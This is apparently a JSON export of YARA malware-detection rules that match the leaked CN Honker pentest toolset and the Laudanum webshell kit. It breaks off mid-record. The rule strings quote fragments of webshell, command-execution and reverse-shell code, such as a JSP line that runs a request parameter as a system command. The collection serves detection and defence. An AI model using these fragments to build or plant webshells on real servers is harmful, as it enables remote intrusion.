CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked_RID442C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files PostgreSQL.exe, mysql_injectV1.1_Creak.exe, Oracle.exe, SQLServer_inject_Creaked.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 02:41:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"zhaoxypass@yahoo.com.cn\" fullword ascii\n      $s2 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n      $s3 = \"ProxyParams.ProxyPort\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}","date":"2015-06-23 02:41:51","description":"Sample from CN Honker Pentest Toolset - from files PostgreSQL.exe, mysql_injectV1.1_Creak.exe, Oracle.exe, SQLServer_inject_Creaked.exe","minimum_yara":"1.7","name":"CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked_RID442C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e16d7e0d0d89ed385c4fe126d5315cc1","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker__wwwscan_wwwscan_wwwscan_gui_RID36A6 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files wwwscan.exe, wwwscan.exe, wwwscan_gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:04:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n      $s2 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 17:04:51","description":"Sample from CN Honker Pentest Toolset - from files wwwscan.exe, wwwscan.exe, wwwscan_gui.exe","minimum_yara":"1.7","name":"CN_Honker__wwwscan_wwwscan_wwwscan_gui_RID36A6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f2f4765ceb4885ed54cce9831d44b8ef","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker__LPK_LPK_LPK_RID2E99 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files LPK.DAT, LPK.DAT, LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:21:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" fullword wide\n      $s2 = \"Password error!\" fullword ascii\n      $s3 = \"\\\\sathc.exe\" fullword ascii\n      $s4 = \"\\\\sothc.exe\" fullword ascii\n      $s5 = \"\\\\lpksethc.bat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1057KB and all of them\n}","date":"2015-06-23 11:21:21","description":"Sample from CN Honker Pentest Toolset - from files LPK.DAT, LPK.DAT, LPK.DAT","minimum_yara":"1.7","name":"CN_Honker__LPK_LPK_LPK_RID2E99","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9574d12023fc461414b245f68fa4ca62","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker__builder_shift_SkinH_RID32C6 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files builder.exe, shift.exe, SkinH.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"lipboard\" fullword ascii\n      $s2 = \"uxthem\" fullword ascii\n      $s3 = \"ENIGMA\" fullword ascii\n      $s4 = \"UtilW0ndow\" fullword ascii\n      $s5 = \"prog3am\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6075KB and all of them\n}","date":"2015-06-23 14:19:31","description":"Sample from CN Honker Pentest Toolset - from files builder.exe, shift.exe, SkinH.exe","minimum_yara":"1.7","name":"CN_Honker__builder_shift_SkinH_RID32C6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5011eee543a6c934cd6681fc80ed1e1d","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker__lcx_HTran2_4_htran20_RID324C : DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files lcx.exe, HTran2.4.exe, htran20.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s2 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $s3 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 440KB and all of them\n}","date":"2015-06-23 13:59:11","description":"Sample from CN Honker Pentest Toolset - from files lcx.exe, HTran2.4.exe, htran20.exe","minimum_yara":"1.7","name":"CN_Honker__lcx_HTran2_4_htran20_RID324C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"77dbcb4648695c0d7db307a8f77fddcc","score":70,"tags":["T1090","DEMO","FILE","T1020","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32_RID3E17 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - from files D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 22:22:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"upfile.asp \" fullword ascii\n      $s2 = \"[wscript.shell]\" fullword ascii\n      $s3 = \"XP_CMDSHELL\" fullword ascii\n      $s4 = \"[XP_CMDSHELL]\" fullword ascii\n      $s5 = \"http://d99net.3322.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 4 of them\n}","date":"2015-06-23 22:22:21","description":"Sample from CN Honker Pentest Toolset - from files D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe","minimum_yara":"1.7","name":"CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32_RID3E17","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"7bcc6f54a188188b2adeef4a95396ce6","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_XML_WEB_INF_web_RID2FAD : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file web.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 12:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<servlet-name>Command</servlet-name>\" fullword ascii\n      $s2 = \"<jsp-file>/cmd.jsp</jsp-file>\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-22 12:07:21","description":"Laudanum Injector Tools - file web.xml","minimum_yara":"1.7","name":"Webshell_XML_WEB_INF_web_RID2FAD","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"7fc1f640aa35aacf5f07e14c341921f1","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Laudanum_Tools_Generic_RID3369 : DEMO GEN HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 14:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"***  laudanum@secureideas.net\" fullword ascii\n      $s2 = \"*** Laudanum Project\" fullword ascii\n   condition: \n      filesize < 60KB and all of them\n}","date":"2015-06-22 14:46:41","description":"Laudanum Injector Tools","minimum_yara":"1.7","name":"Webshell_Laudanum_Tools_Generic_RID3369","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"53ef2b76836889b4db91fd2bd73873ea","score":75,"tags":["T1100","DEMO","WEBSHELL","GEN","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_asp_file_RID2DE9 : DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file file.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"' *** Written by Tim Medin <tim@counterhack.com>\" fullword ascii\n      $s2 = \"Response.BinaryWrite(stream.Read)\" fullword ascii\n      $s3 = \"Response.Write(Response.Status & Request.ServerVariables(\\\"REMOTE_ADDR\\\"))\" fullword ascii\n      $s4 = \"%><a href=\\\"<%=Request.ServerVariables(\\\"URL\\\")%>\\\">web root</a><br/><%\" fullword ascii\n      $s5 = \"set folder = fso.GetFolder(path)\" fullword ascii\n      $s6 = \"Set file = fso.GetFile(filepath)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 30KB and 5 of them\n}","date":"2015-06-22 10:52:01","description":"Laudanum Injector Tools - file file.asp","minimum_yara":"1.7","name":"Webshell_asp_file_RID2DE9","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"f38f963b29b0a628b0e998c5a8fee04e","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_php_killnc_RID2ECA : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file killnc.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n      $s2 = \"header(\\\"HTTP/1.0 404 Not Found\\\");\" fullword ascii\n      $s3 = \"<?php echo exec('killall nc');?>\" fullword ascii\n      $s4 = \"<title>Laudanum Kill nc</title>\" fullword ascii\n      $s5 = \"foreach ($allowedIPs as $IP) {\" fullword ascii\n   condition: \n      filesize < 15KB and 4 of them\n}","date":"2015-06-22 11:29:31","description":"Laudanum Injector Tools - file killnc.php","minimum_yara":"1.7","name":"Webshell_php_killnc_RID2ECA","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"b4c8b03a8d5a30175c71e0295bec8b56","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_asp_shell_2_RID2EF2 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:36:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form action=\\\"shell.asp\\\" method=\\\"POST\\\" name=\\\"shell\\\">\" fullword ascii\n      $s2 = \"%ComSpec% /c dir\" fullword ascii\n      $s3 = \"Set objCmd = wShell.Exec(cmd)\" fullword ascii\n      $s4 = \"Server.ScriptTimeout = 180\" fullword ascii\n      $s5 = \"cmd = Request.Form(\\\"cmd\\\")\" fullword ascii\n      $s6 = \"' ***  http://laudanum.secureideas.net\" fullword ascii\n      $s7 = \"Dim wshell, intReturn, strPResult\" fullword ascii\n   condition: \n      filesize < 15KB and 4 of them\n}","date":"2015-06-22 11:36:11","description":"Laudanum Injector Tools - file shell.asp","minimum_yara":"1.7","name":"Webshell_asp_shell_2_RID2EF2","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"0e237cf83024ed46fe19c16f03cee10f","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_settings_PHP_RID2F5E : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file settings.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Port: <input name=\\\"port\\\" type=\\\"text\\\" value=\\\"8888\\\">\" fullword ascii\n      $s2 = \"<li>Reverse Shell - \" fullword ascii\n      $s3 = \"<li><a href=\\\"<?php echo plugins_url('file.php', __FILE__);?>\\\">File Browser</a>\" ascii\n   condition: \n      filesize < 13KB and all of them\n}","date":"2015-06-22 11:54:11","description":"Laudanum Injector Tools - file settings.php","minimum_yara":"1.7","name":"Webshell_settings_PHP_RID2F5E","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"b47d626ae356dc4c0dd040958709198d","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_asp_proxy_RID2E8B : DEMO HKTL T1090 T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file proxy.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1090, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"'response.write \\\"<br/>  -value:\\\" & request.querystring(key)(j)\" fullword ascii\n      $s2 = \"q = q & \\\"&\\\" & key & \\\"=\\\" & request.querystring(key)(j)\" fullword ascii\n      $s3 = \"for each i in Split(http.getAllResponseHeaders, vbLf)\" fullword ascii\n      $s4 = \"'urlquery = mid(urltemp, instr(urltemp, \\\"?\\\") + 1)\" fullword ascii\n      $s5 = \"s = urlscheme & urlhost & urlport & urlpath\" fullword ascii\n      $s6 = \"Set http = Server.CreateObject(\\\"Microsoft.XMLHTTP\\\")\" fullword ascii\n   condition: \n      filesize < 50KB and all of them\n}","date":"2015-06-22 11:19:01","description":"Laudanum Injector Tools - file proxy.asp","minimum_yara":"1.7","name":"Webshell_asp_proxy_RID2E8B","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"70b32b75e6362e33119e9c3f42fa5a11","score":75,"tags":["T1100","T1090","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_cfm_shell_RID2E53 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.cfm\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Executable: <Input type=\\\"text\\\" name=\\\"cmd\\\" value=\\\"cmd.exe\\\"><br>\" fullword ascii\n      $s2 = \"<cfif ( #suppliedCode# neq secretCode )>\" fullword ascii\n      $s3 = \"<cfif IsDefined(\\\"form.cmd\\\")>\" fullword ascii\n   condition: \n      filesize < 20KB and 2 of them\n}","date":"2015-06-22 11:09:41","description":"Laudanum Injector Tools - file shell.cfm","minimum_yara":"1.7","name":"Webshell_cfm_shell_RID2E53","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"dc6f1a7debe0324351fc0cd1f5450446","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_aspx_shell_RID2ED9 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"remoteIp = HttpContext.Current.Request.Headers[\\\"X-Forwarded-For\\\"].Split(new\" ascii\n      $s2 = \"remoteIp = Request.UserHostAddress;\" fullword ascii\n      $s3 = \"<form method=\\\"post\\\" name=\\\"shell\\\">\" fullword ascii\n      $s4 = \"<body onload=\\\"document.shell.c.focus()\\\">\" fullword ascii\n   condition: \n      filesize < 20KB and all of them\n}","date":"2015-06-22 11:32:01","description":"Laudanum Injector Tools - file shell.aspx","minimum_yara":"1.7","name":"Webshell_aspx_shell_RID2ED9","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"62fd554b7cd4de08f115b2841c9039d5","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_php_shell_RID2E65 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:12:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"command_hist[current_line] = document.shell.command.value;\" fullword ascii\n      $s2 = \"if (e.keyCode == 38 && current_line < command_hist.length-1) {\" fullword ascii\n      $s3 = \"array_unshift($_SESSION['history'], $command);\" fullword ascii\n      $s4 = \"if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {\" fullword ascii\n   condition: \n      filesize < 40KB and all of them\n}","date":"2015-06-22 11:12:41","description":"Laudanum Injector Tools - file shell.php","minimum_yara":"1.7","name":"Webshell_php_shell_RID2E65","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"6da2d517970e4670d16558c039c39048","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_php_reverse_shell_RID31C0 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 13:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n      $s2 = \"printit(\\\"Successfully opened reverse shell to $ip:$port\\\");\" fullword ascii\n      $s3 = \"$input = fread($pipes[1], $chunk_size);\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}","date":"2015-06-22 13:35:51","description":"Laudanum Injector Tools - file php-reverse-shell.php","minimum_yara":"1.7","name":"Webshell_php_reverse_shell_RID31C0","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"42a825b987cc17df62a7ea73c71460b0","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_php_dns_RID2D92 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file dns.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$query = isset($_POST['query']) ? $_POST['query'] : '';\" fullword ascii\n      $s2 = \"$result = dns_get_record($query, $types[$type], $authns, $addtl);\" fullword ascii\n      $s3 = \"if ($_SERVER[\\\"REMOTE_ADDR\\\"] == $IP)\" fullword ascii\n      $s4 = \"foreach (array_keys($types) as $t) {\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}","date":"2015-06-22 10:37:31","description":"Laudanum Injector Tools - file dns.php","minimum_yara":"1.7","name":"Webshell_php_dns_RID2D92","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"d96e1c5b7792bd77e1f59fd5538f1333","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file cmd.war\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:59:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.jsp}\" fullword ascii\n      $s1 = \"cmd.jspPK\" fullword ascii\n      $s2 = \"WEB-INF/web.xml\" fullword ascii\n      $s3 = \"WEB-INF/web.xmlPK\" fullword ascii\n      $s4 = \"META-INF/MANIFEST.MF\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them\n}","date":"2015-06-22 10:59:41","description":"Laudanum Injector Tools - file cmd.war","minimum_yara":"1.7","name":"Webshell_jsp_cmd_2_RID2E17","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"6e9c053b2db030a98610ac35e7b7b9f9","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_laudanum_RID2DFD : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file laudanum.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"public function __activate()\" fullword ascii\n      $s2 = \"register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));\" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}","date":"2015-06-22 10:55:21","description":"Laudanum Injector Tools - file laudanum.php","minimum_yara":"1.7","name":"Webshell_laudanum_RID2DFD","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"68c95e5905d86aa622e954fed85349f6","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_php_file_RID2DED : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file file.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:52:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$allowedIPs =\" fullword ascii\n      $s2 = \"<a href=\\\"<?php echo $_SERVER['PHP_SELF']  ?>\\\">Home</a><br/>\" fullword ascii\n      $s3 = \"$dir  = isset($_GET[\\\"dir\\\"])  ? $_GET[\\\"dir\\\"]  : \\\".\\\";\" fullword ascii\n      $s4 = \"$curdir .= substr($curdir, -1) != \\\"/\\\" ? \\\"/\\\" : \\\"\\\";\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-22 10:52:41","description":"Laudanum Injector Tools - file file.php","minimum_yara":"1.7","name":"Webshell_php_file_RID2DED","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"ad099cbdfd204f43228377d3a4c5371e","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_warfiles_cmd_RID2F96 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 12:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process p = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\"));\" fullword ascii\n      $s2 = \"out.println(\\\"Command: \\\" + request.getParameter(\\\"cmd\\\") + \\\"<BR>\\\");\" fullword ascii\n      $s3 = \"<FORM METHOD=\\\"GET\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword ascii\n      $s4 = \"String disr = dis.readLine();\" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}","date":"2015-06-22 12:03:31","description":"Laudanum Injector Tools - file cmd.jsp","minimum_yara":"1.7","name":"Webshell_warfiles_cmd_RID2F96","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"cdad72832b932dac4dbfd85b6a0893be","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_asp_dns_RID2D8E : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file dns.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"command = \\\"nslookup -type=\\\" & qtype & \\\" \\\" & query \" fullword ascii\n      $s2 = \"Set objCmd = objWShell.Exec(command)\" fullword ascii\n      $s3 = \"Response.Write command & \\\"<br>\\\"\" fullword ascii\n      $s4 = \"<form name=\\\"dns\\\" method=\\\"POST\\\">\" fullword ascii\n   condition: \n      filesize < 21KB and all of them\n}","date":"2015-06-22 10:36:51","description":"Laudanum Injector Tools - file dns.asp","minimum_yara":"1.7","name":"Webshell_asp_dns_RID2D8E","reference":"http://laudanum.inguardians.com/","required_modules":[],"rule_hash":"d5a8cfb12bb0ecc1ddd7b5126f1ff196","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule php_reverse_shell_2_RID2EBC : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:27:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, 